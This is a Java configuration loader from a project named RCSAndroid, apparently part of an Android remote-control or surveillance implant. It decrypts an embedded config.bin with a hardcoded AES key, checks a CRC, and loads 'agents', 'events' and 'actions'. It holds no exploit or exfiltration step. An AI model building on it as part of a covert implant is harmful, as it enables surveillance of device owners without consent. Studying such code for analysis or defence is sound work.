/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI.conf;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.Event;
import com.ht.RCSAndroidGUI.R;
import com.ht.RCSAndroidGUI.RCSException;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.R.raw;
import com.ht.RCSAndroidGUI.action.Action;
import com.ht.RCSAndroidGUI.agent.Agent;
import com.ht.RCSAndroidGUI.crypto.Crypto;
import com.ht.RCSAndroidGUI.utils.Utils;

import android.content.res.Resources;
import android.util.Log;

public class Configuration {
	private Status statusObj;
	
	/**
	 * Configuration file embedded into the .apk
	 */
	private Resources rResources;
	
	/**
	 * Clear configuration buffer wrapped into a ByteBuffer
	 */
	private ByteBuffer wrappedClearConf;
	
	/**
     * Configuration file tags (ASCII format, NULL-terminated in binary configuration)
     */
    public static final String AGENT_CONF_DELIMITER = "AGENTCONFS-";
    public static final String EVENT_CONF_DELIMITER = "EVENTCONFS-";
    public static final String MOBIL_CONF_DELIMITER = "MOBILCONFS-";
    
    /**
     * This one is _not_ NULL-terminated into the binary configuration
     */
    public static final String ENDOF_CONF_DELIMITER = "ENDOFCONFS-";
    
	public Configuration(Resources r) {
		statusObj = Status.self();
		rResources = r;
	}
	
	/**
	 * 
	 * @param buffer : input buffer
	 * @param offset : offset
	 * @param len : length of data into the buffer (buffer can be larger than data)
	 * @return
	 */
	private int crc(final byte[] buffer, final int offset, final int len) {
        // CRC
        int confHash;
        long tempHash = 0;

        for (int i = offset; i < (len - offset); i++) {
            tempHash++;

            final byte b = buffer[i];

            if (b != 0) {
                tempHash *= b;
            }

            confHash = (int) (tempHash >> 32);

            tempHash = tempHash & 0xFFFFFFFFL;
            tempHash ^= confHash;
            tempHash = tempHash & 0xFFFFFFFFL;
        }

        confHash = (int) tempHash;
        Log.d("RCS", "Configuration CRC: " + confHash);
        return confHash;
    }
	
	/**
	 * Return the index at witch tag begins
	 * 
	 * @param tag string
	 * @return the offset where the tag ends
	 */
	private int findTag(String tag) throws RCSException {
		int index = Utils.getIndex(wrappedClearConf.array(), tag.getBytes());
		
		if (index == -1) {
			throw new RCSException("Tag " + tag + " not found");
		}
		
		Log.d("RCS", "Tag " + tag + " found at: " + index);
		return index;
	}
	
	/**
	 * Parses configuration file and loads the agents into Status
	 */
	private void loadAgents() throws RCSException {
		int agentTag;
		
		try {
			// Identify agents' section
			agentTag = findTag(AGENT_CONF_DELIMITER);
			agentTag += AGENT_CONF_DELIMITER.length() + 1;
		} catch (RCSException rcse) {
			throw rcse;
		}
		
		// How many agents we have?
		int agentNum = wrappedClearConf.getInt(agentTag);
		wrappedClearConf.position(agentTag + 4);

		Log.d("RCS", "Number of agents: " + agentNum);
		
		// Get id, status, parameters length and parameters
		for (int i = 0; i < agentNum; i++) {
			int id = wrappedClearConf.getInt();
			int status = wrappedClearConf.getInt();
			int plen = wrappedClearConf.getInt();
			
			byte[] params = new byte[plen];
			
			if (plen != 0)
				wrappedClearConf.get(params, 0, plen);
			
			Log.d("RCS", "Agent: " + id + " Status: " + status + " Params Len: " + plen);
			
			Agent a = new Agent(id, status, params);
			statusObj.addAgent(a);
		}
		
		return;
	}
	
	/**
	 * Parses configuration file and loads the events into Status
	 */
	private void loadEvents() throws RCSException {
		int eventTag;
		
		try {
			// Identify events' section
			eventTag = findTag(EVENT_CONF_DELIMITER);
			eventTag += EVENT_CONF_DELIMITER.length() + 1;
		} catch (RCSException rcse) {
			throw rcse;
		}
		
		// How many events we have?
		int eventNum = wrappedClearConf.getInt(eventTag);
		wrappedClearConf.position(eventTag + 4);

		Log.d("RCS", "Number of events: " + eventNum);
		
		// Get id, status, parameters length and parameters
		for (int i = 0; i < eventNum; i++) {
			int type = wrappedClearConf.getInt();
			int action = wrappedClearConf.getInt();
			int plen = wrappedClearConf.getInt();
			
			byte[] params = new byte[plen];
			
			if (plen != 0)
				wrappedClearConf.get(params, 0, plen);
			
			Log.d("RCS", "Event: " + type + " Action: " + action + " Params Len: " + plen);
			
			Event e = new Event(type, i, action, params);
			statusObj.addEvent(e);
		}
		
		return;
	}
	
	/*
	 * Load the actions into Status, due to configuration file format,
	 * this method can only be called after calling loadEvents()
	 */
	private void loadActions() throws RCSException {
		int actionNum = wrappedClearConf.getInt();
		
		Log.d("RCS", "Number of actions " + actionNum);
		
		try {
			for (int i = 0; i < actionNum; i++) {
				int subNum = wrappedClearConf.getInt();
				
				Action a = new Action(i, subNum);
				
				Log.d("RCS", "Action " + i + " SubActions: " + subNum);
				
				for (int j = 0; j < subNum; j++) {
					int type = wrappedClearConf.getInt();
					int plen = wrappedClearConf.getInt();
					
					byte[] params = new byte[plen];
					
					if (plen != 0)
						wrappedClearConf.get(params, 0, plen);
					
					a.addSubAction(type, params);
					
					Log.d("RCS", "SubAction " + j + " Type: " + type + " Params Length: " + plen);
				}
				
				statusObj.addAction(a);
			}	
		} catch (RCSException rcse) {
			throw rcse;
		}
		
		return;
	}
	
	private void loadOptions() throws RCSException {
		int optionsTag;

		try {
			// Identify agents' section		
			optionsTag = findTag(MOBIL_CONF_DELIMITER);
			optionsTag += MOBIL_CONF_DELIMITER.length() + 1;
		} catch (RCSException rcse) {
			throw rcse;
		}

		// How many agents we have?
		int optionsNum = wrappedClearConf.getInt(optionsTag);
		wrappedClearConf.position(optionsTag + 4);

		Log.d("RCS", "Number of options: " + optionsNum);

		// Get id, status, parameters length and parameters
		for (int i = 0; i < optionsNum; i++) {
			int id = wrappedClearConf.getInt();
			int plen = wrappedClearConf.getInt();

			byte[] params = new byte[plen];

			if (plen != 0)
				wrappedClearConf.get(params, 0, plen);

			Log.d("RCS", "Option: " + id + " Params Len: " + plen);

			Option o = new Option(id, params);
			statusObj.addOption(o);
		}

		return;
	}
	
	private void decryptConfiguration() throws RCSException {
		/**
         * Struttura del file di configurazione
         *
         * |DWORD|DWORD|DWORD|DATA.....................|CRC|
         * |---Skip----|-Len-|
         *
         * Le prime due DWORD vanno skippate.
         * La terza DWORD contiene la lunghezza del blocco di dati (inclusa la stessa Len)
         * CRC e' il CRC (cifrato) dei dati in chiaro, inclusa la DWORD Len
         */
		
		try {	
			// Open conf from resources and load it into rawConf
			byte[] rawConf = Utils.InputStreamToBuffer(rResources.openRawResource(R.raw.config), 8); // config.bin
			
			if (rawConf == null) {
				throw new RCSException("Cannot allocate memory for configuration");
			}
			
			// Decrypt configuration
			byte[] aesConfKey = new byte[] { (byte)0xa9, (byte)0x98, (byte)0x76, (byte)0x7f, (byte)0x8c, 
											 (byte)0x31, (byte)0x99, (byte)0xb0, (byte)0x33, (byte)0x8c, 
											 (byte)0xb2, (byte)0xd9, (byte)0x98, (byte)0x08, (byte)0x42, 
											 (byte)0x58 };

			//Crypto crypto = new Crypto(Keys.g_ConfKey);
			Crypto crypto = new Crypto(aesConfKey);
			byte[] clearConf = crypto.decrypt(rawConf, 0);
			
			// Extract clear length DWORD
			this.wrappedClearConf = Utils.BufferToByteBuffer(clearConf, ByteOrder.LITTLE_ENDIAN);
			
			int confClearLen = this.wrappedClearConf.getInt();

			// Verify CRC
			int confCrc = this.wrappedClearConf.getInt(confClearLen - 4);
			
			if (confCrc != crc(clearConf, 0, confClearLen - 4)) {
				throw new RCSException("CRC mismatch, stored CRC = " + confCrc + " calculated CRC = " + crc(clearConf, 0, confClearLen));
			}
			
			// Return decrypted conf
			Log.d("RCS", "Configuration is valid");
			return;
		} catch (IOException ioe) {
			ioe.printStackTrace();
			Log.d("RCS", "IOException() detected");
		} catch (SecurityException se) {
			se.printStackTrace();
			Log.d("RCS", "SecurityException() detected");
		} catch (Exception e) {
			e.printStackTrace();
			Log.d("RCS", "Exception() detected");			
		}
		
		return;
	}
	
	private void parseConfiguration() throws RCSException {
		try {
			// Parse the whole configuration
			loadAgents();
			loadEvents();
			loadActions();
			loadOptions();
			
			// Debug checks start
			Debug.StatusActions();
			Debug.StatusAgents();
			Debug.StatusEvents();
			Debug.StatusOptions();
			// Debug checks end
		} catch (RCSException rcse) {
			throw rcse;
		}
		
		return;
	}
	
	public void LoadConfiguration() throws RCSException {
		try {
			// Clean old configuration
			cleanConfiguration();
			
			// Decrypt Conf
			decryptConfiguration();
			
			// Parse and load configuration
			parseConfiguration();
		} catch (RCSException rcse) {
			throw rcse;
		}
		
		return;
	}
	
	/**
	 * Clean configuration and status objects
	 */
	public void cleanConfiguration() {
		// Clean an eventual old initialization
		statusObj.clean();
		
		// Clean configuration buffer
		wrappedClearConf = null;
	}
}
